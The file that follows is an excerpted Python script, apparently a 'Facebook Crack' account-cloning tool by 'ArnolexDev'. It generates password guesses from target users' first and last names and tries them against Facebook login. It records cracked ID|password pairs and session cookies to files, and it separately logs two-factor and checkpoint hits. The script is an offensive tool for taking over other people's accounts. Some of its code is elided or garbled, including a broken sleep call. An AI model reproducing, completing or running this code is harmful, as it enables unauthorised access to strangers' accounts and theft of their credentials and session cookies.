...
def request_storage_permission():
    try:
        open('/sdcard/@Arnolexdev', 'w').write(' ')
    except Exception as e:
        print(e)
...
sys.stdout.write('\x1b]2; Arnolex Cracking \x07')
os.system('xdg-open https://facebook.com/Arnolexdev')
time.sleep(😎
# -------------(MAIN LOGO)--------------
def Banner():
    os.system('clear' if 'Linux' in sys.platform.capitalize() else 'cls')
    return f'''{white} {bold}{red}
╭─────────────────────╮
│                     │
│  ╔═╗┬ ┬┌┬┐┌─┐  ╔═╗  │
│  ╠═╣│ │ │ │ │  ║    │
│  ╩ ╩└─┘ ┴ └─┘  ╚═╝  │
│{red}{white}\033[101mAUTHOR {white}{red}: {yellow}@ArnolexDev{red} │
{red}╰─────────────────────╯
{white}{red}[{green}⛖{red}]{white} {red}{green}Mode{red}: {yellow}\033[104mFacebook Crack{white}{red} 
{red}
'''
...
def XYZ():
	print(Banner())
	print(f"{red}[{green}1{red}] {white}File Cloning\n{red}[{green}2{red}] {white}Number Cloning")
	
	option = input(f'{red}[{green}➤{red}] {white}Choose Option : \033[1;37m')
	if option in ['1','01']:
		main()
	if option in ['2','02']:
		pakistan()
...
def get_password_list():
    ...
    print(f"{red}[{green}1{red}] {white}Auto Pass\n{red}[{green}2{red}] {white}Choose Pass")
   
    choice = input(f'{red}[{green}➤{red}] {white}Choose Option : \033[1;37m')
    
    if choice in ['1', '01']:
        
        plist.extend([
            'first last', 'firstlast', 'first123', 'first1234','first12345',
            'First Last', 'first786', 'firstlast123', 'firstlast786', 'firstlast123', 'firstlast12345'
        ])
    else:
        try:
...
def main():
    try:
        print(Banner())
        print(f'{r_cyan}Put file example: /sdcard/Arnolexdev.txt')
...
def pakistan():
		...
		if pl in ['auto','Auto','AUTO','auto or Auto']:
			...
			passlist.append('firstlast123')
			passlist.append('firstlast12345')
			passlist.append('first123')
			passlist.append('first143')
			passlist.append('first12345')
			passlist.append('first16')
			passlist.append('first18')
			passlist.append('first17')
			passlist.append('first14')
			passlist.append('first098')
			passlist.append('firstpogi')
			passlist.append('firstganda')

# Additional items following the pattern you specified
			passlist.append('firstlast111')
			passlist.append('firstlast222')
			passlist.append('firstlast333')
			passlist.append('firstlast444')
			passlist.append('firstlast555')
			passlist.append('firstlast666')
			passlist.append('firstlast777')
			passlist.append('firstlast888')
			passlist.append('firstlast999')
			passlist.append('first123456')
			passlist.append('first654321')
			passlist.append('first987')
			passlist.append('first876')
			passlist.append('first765')
			passlist.append('first654')
			passlist.append('first543')
			passlist.append('first432')
			passlist.append('first321')
			passlist.append('first111')
			passlist.append('first222')
			passlist.append('first333')
			passlist.append('first444')
			passlist.append('first555')
			passlist.append('first666')
			passlist.append('first777')
			passlist.append('first888')
			passlist.append('first999')
...
def api(ids,names,passlist,total_ids,start_time):
        try:
                ...
                sys.stdout.write(f"\r{x}[ArnolexDev] {younisxd} {loop}/{total_ids}{reset}{green} OK:{len(oks)} {white}[{'{:.1%}'.format(loop/float(total_ids))}]");sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
                ...
                for pw in passlist:
                        ...
                        if 'session_key' in po:
                                        print('\r\033[1;92m[Successful-ARNOLEX] '+ids+'|'+pas+'')
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                        print(f"\r{r_green} {coki}") 
                                        open(f'/sdcard/arnolexdev_ok.txt','a', encoding='utf-8').write(f'[ARNOLEX-OK] {ids} | {pas}\n')
                                        open(f'/sdcard/arnolexdev_ok_with_cookies.txt','a', encoding='utf-8').write(f'[ARNOLEX-OK] {ids} | {pas} {coki}\n')
                                        oks.append(ids)
                                        break
                        elif twf in str(po):
                                        print(f'\r\033[9;91m[Two-Fector-XYZ] {ids}|{pas}\033[0m')
                                        open(f'/sdcard/xyz_2f.txt','a', encoding='utf-8').write(f'[ARNOLEX-2F] {ids} | {pas}\n')
                                        tfa.append(ids)
                                        break
                        elif 'www.facebook.com' in po['error_msg']:
                                        print(f'\r{yellow}[CheckPoint-ARNOLEX] {ids}|{pas}')
                                        open(f'/sdcard/arnolexdev_cp.txt','a', encoding='utf-8').write(f'[ARNOLEX-CP] {ids} | {pas}\n')
                                        break
                                        cps.append(ids)
                        else:
                        	continue
